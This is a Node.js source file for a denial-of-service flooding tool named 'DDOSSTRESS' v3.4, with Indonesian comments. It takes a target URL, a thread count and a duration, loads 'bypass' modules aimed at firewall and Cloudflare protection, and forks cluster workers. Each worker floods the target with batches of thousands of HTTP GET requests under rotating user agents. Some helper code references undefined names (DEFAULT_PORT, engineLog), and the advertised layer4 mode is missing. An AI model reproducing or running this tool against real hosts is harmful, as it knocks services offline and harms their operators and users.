const chalk = require("chalk");
const { URL } = require("url");
const net = require("net");
const http = require("http");
const https = require("https");
const fs = require("fs");
const figlet = require("figlet");
const http2 = require('http2');
const gradient = require("gradient-string");
const tls = require("tls");
const crypto = require("crypto");
const cluster = require("cluster");
const events = require("events");
// === loader bypass (pakai require agar support CJS/ESM) ===
async function loadBypass(fw) {
  try {
    const bypassModule = require(`./bypasses/${fw}.js`);
    return bypassModule.default || bypassModule;
  } catch (err) {
    console.error(`[!] Bypass module '${fw}' tidak ditemukan: ${err.message}`);
    return null;
  }
}

const ignoreNames = [
  "RequestError", "StatusCodeError", "CaptchaError",
  "CloudflareError", "ParseError", "ParserError"
];
const ignoreCodes = [
  "SELF_SIGNED_CERT_IN_CHAIN", "ECONNRESET", "ERR_ASSERTION",
  "ECONNREFUSED", "EPIPE", "EHOSTUNREACH",
  "ETIMEDOUT", "ESOCKETTIMEDOUT", "EPROTO"
];

const userAgents = fs.readFileSync("./useragents.txt", "utf-8")
  .split("\n")
  .filter(line => line.trim().length > 0);

if (process.argv.length < 7) {
  console.log(chalk.red("Usage: node ddosstress2.js <target> <threads> <duration_sec> --layer <layer4|layer7> --mode <modefile.js>"));
  process.exit(1);
}

const targetStr   = process.argv[2];
const concurrency = parseInt(process.argv[3], 10) || 5;
const durationSec = parseInt(process.argv[4], 10) || 60;
const duration    = durationSec * 1000;
const layerFlag   = process.argv[6].toLowerCase() || "layer7";
const PACKET_SIZE = 432492;

// === parsing mode ===
let modeFile = null;
const modeIndex = process.argv.indexOf("--mode");
if (modeIndex !== -1 && process.argv[modeIndex + 1]) {
  modeFile = process.argv[modeIndex + 1];
}

// 🚨 wajib isi mode
if (!modeFile) {
  console.log(chalk.red("Error: Anda harus menambahkan --mode <file.js>"));
  process.exit(1);
}

let urlObj, hostname, port, protocol;
try {
  if (/^https?:\/\//i.test(targetStr)) {
    urlObj = new URL(targetStr);
    hostname = urlObj.hostname;
    protocol = urlObj.protocol;
    port = urlObj.port ? parseInt(urlObj.port, 10) : (protocol === "https:" ? 443 : 80);
  } else {
    protocol = "http:";
    hostname = targetStr;
    port = 80;
    urlObj = new URL(`${protocol}//${hostname}:${port}`);
  }
} catch {
  console.log(chalk.red("Invalid target"));
  process.exit(1);
}

async function checkPort(host, port) {
  return new Promise(resolve => {
    const socket = net.createConnection({ host, port, timeout: 2000 }, () => {
      socket.destroy();
      resolve(true);
    });
    socket.on("error", () => resolve(false));
    socket.on("timeout", () => { socket.destroy(); resolve(false); });
  });
}

function printBanner() {
  try {
    console.log(gradient.pastel.multiline(
      figlet.textSync("DDOSSTRESS", { horizontalLayout: "default" })
    ));
  } catch {
    console.log(chalk.green.bold("=================================================="));
  }
  console.log(chalk.gray(`                              v3.4\n`));
  console.log(chalk.red("-> ") + chalk.yellow("Target     ") + "📌 " + chalk.green(urlObj.href));
  console.log(chalk.red("-> ") + chalk.yellow("Threads    ") + "🧵 " + chalk.blue(concurrency));
  console.log(chalk.red("-> ") + chalk.yellow("Duration   ") + "⏱ " + chalk.green(durationSec + "s"));
  console.log(chalk.red("-> ") + chalk.yellow("Layer      ") + "🌐 " + chalk.magenta(layerFlag));
  if (modeFile) {
    console.log(chalk.red("-> ") + chalk.yellow("Mode       ") + "⚙️ " + chalk.cyan(modeFile));
  }
   console.log("[31m-> [0mGithub[33m 🗂 : [32mhttps://github.com/chainner190");
  console.log("[31m-> [0mCheck-Host[33m 🗂 :  [32mhttps://check-host.net/check-http?host=" + process.argv[0x2]);
  console.log(chalk.green.bold("=================================================="));
}
function buildTlsOptions({ host, port = DEFAULT_PORT, clientCert, clientKey, caFile } = {}) {
  const ciphers = [
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_128_GCM_SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
  ].join(":");
const opts = {
    host,
    port,
    minVersion: "TLSv1.3",
    honorCipherOrder: true,
    ecdhCurve: "X25519:prime256v1",
    ALPNProtocols: ["h2", "http/1.1"],
    ciphers,
    rejectUnauthorized: true,
    servername: host,
    sessionTimeout: 5000,
  };

  if (caFile) {
    try {
      opts.ca = fs.readFileSync(caFile);
    } catch {}
  }

  if (clientCert && clientKey) {
    try {
      opts.cert = fs.readFileSync(clientCert);
      opts.key = fs.readFileSync(clientKey);
    } catch {}
  }

  return opts;
}
async function http2Request(host, port = DEFAULT_PORT, path = DEFAULT_PATH, extraOpts = {}) {
  const tlsOpts = buildTlsOptions({ host, port, ...extraOpts });
  const session = http2.connect(`https://${host}:${port}`, tlsOpts);

  return new Promise((resolve, reject) => {
    const cleanup = () => {
      session.removeAllListeners();
      try { session.close(); } catch {}
    };

    const onError = (err) => {
      cleanup();
      reject(err);
    };

    session.once("error", onError);
    session.once("socketError", onError);

    session.on("connect", () => {
      const socket = session.socket;
      const negotiatedProtocol = socket.alpnProtocol || "unknown";

      engineLog(1, `Connected. ALPN=${negotiatedProtocol}`);

      const req = session.request(
        {
          ":method": "GET",
          ":path": path,
          ":authority": host,
          "user-agent": "tls-client-secure/1.0",
        },
        { endStream: true }
      );

      let data = "";
      req.setEncoding("utf8");

      req.on("data", (chunk) => { data += chunk; });
      req.on("end", () => {
        cleanup();
        resolve({ data });
      });
      req.on("error", (err) => {
        cleanup();
        reject(err);
      });
    });

    const connTimeout = setTimeout(() => {
      cleanup();
      reject(new Error("Connection timeout"));
    }, 15000);

    session.once("close", () => clearTimeout(connTimeout));
  });
}

// --- Master ---
if (cluster.isPrimary) {
  (async () => {
    const isOpen = await checkPort(hostname, port);

    printBanner();
    console.log(chalk.yellow(`Port state : ${isOpen ? chalk.green("OPEN") : chalk.red("CLOSED")}`));

    // === load bypass sesuai mode ===
    const fwName = modeFile.replace(/\.js$/i, "");
    const bypass = await loadBypass(fwName);

    if (bypass) {
      bypass({ target: urlObj.href });
    }

    for (let id = 1; id <= concurrency; id++) {
      await new Promise(resolve => {
        const worker = cluster.fork({
          WORKER_ID: id,
          URL: urlObj.href,
          LAYER: layerFlag,
          DURATION: duration,
          MODE: modeFile || ""
        });
        worker.once("online", () => resolve());
      });
    }

    setTimeout(() => {
      console.log(chalk.red.bold("\n[ DDOSSTRESS ] Time is up, stopping all engines..."));
      for (const id in cluster.workers) cluster.workers[id].kill();
      process.exit(0);
    }, duration);

    cluster.on("exit", (worker) => {
      const wid = worker?.process?.env?.WORKER_ID || worker.id;
      console.log(chalk.yellow(`[ DDOSSTRESS ] -> Engine ${wid} exited`));
    });
  })();
} else {
  const wid = parseInt(process.env.WORKER_ID, 10);
  const layer = process.env.LAYER;
  const targetUrl = new URL(process.env.URL);
  const mode = process.env.MODE;

  console.log(chalk.green(`[ DDOSSTRESS ] -> Engine ${wid} Started`));

  // --- Error Collector ---
  const errorStats = {};
  function collectError(ip, msg) {
    const key = `${ip}|${msg}`;
    errorStats[key] = (errorStats[key] || 0) + 1;
  }
  setInterval(() => {
    const keys = Object.keys(errorStats).sort();
    for (const key of keys) {
      const [ip, msg] = key.split("|");
      console.log(chalk.red(`[ DDOSSTRESS ] -> (${ip}) An error has occured: ${msg} [x${errorStats[key]}]`));
    }
    for (const k in errorStats) delete errorStats[k];
  }, 30000);

  // --- Layer 7 ---
  async function mainWorkerLayer7(workerId, targetUrl) {
    const MAX_REQUESTS = 10000000;
    const BATCH_SIZE   = 3000;
    let sentRequests = 0, errors = 0;
    const lib = targetUrl.protocol === "https:" ? https : http;
    const agent = new lib.Agent({ keepAlive: true, maxSockets: 20000 });

    const endTime = Date.now() + duration;

    while (sentRequests < MAX_REQUESTS && Date.now() < endTime) {
      const batch = [];

      for (let i = 0; i < BATCH_SIZE && sentRequests + i < MAX_REQUESTS; i++) {
        const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
        batch.push(new Promise(resolve => {
          const options = { agent, headers: { "User-Agent": randomUA } };
          const req = lib.get(targetUrl, options, res => {
            sentRequests++;

            if (res.statusCode >= 400) {
              collectError(targetUrl.hostname, `error ${res.statusCode} (${res.statusMessage})`);
            }

            res.resume();
            resolve();
          });
          req.on("error", (err) => {
            errors++;
            collectError(targetUrl.hostname, `${err.code || "ECONN"} (Connection error)`);
            resolve();
          });
        }));
      }

      if (batch.length === 0) break;

      await Promise.all(batch);
      await new Promise(r => setTimeout(r, 10));
    }

    console.log(chalk.cyan(`[ DDOSSTRESS ] -> Engine ${workerId} Finished. Total Requests: ${sentRequests}, Errors: ${errors}`));
    process.exit(0);
  }

  // jalankan mode layer7 kalau dipilih
  if (layer === "layer7") {
    mainWorkerLayer7(wid, targetUrl);
  }
}
